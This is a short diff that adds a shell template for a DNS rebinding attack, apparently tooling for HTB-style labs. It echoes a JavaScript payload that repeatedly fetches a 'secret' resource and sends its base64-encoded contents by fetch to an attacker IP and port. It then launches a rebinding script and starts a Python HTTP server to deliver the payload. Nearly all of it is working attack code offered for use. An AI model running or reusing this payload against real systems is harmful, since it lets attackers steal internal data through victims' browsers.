@@ -1,0 +1,8 @@
+mkdir -p packstation/outbound; \
+echo '================================================================'; \
+echo '                       -----Linux------                         '; \
+echo 'Host this file on your server: <script>startAttack();function startAttack(){var xhr = new XMLHttpRequest();xhr.open('GET', 'http://www.attacker.htb/secret', true);xhr.onload = () => {fetch('http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/log?data=' + btoa(xhr.response));};xhr.send();setInterval(startAttack, 2000);}</script>'; \
+echo 'Start DNSrebinder.py: <%=$(esh scripts/dnsrebinder-basic)%> '; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+
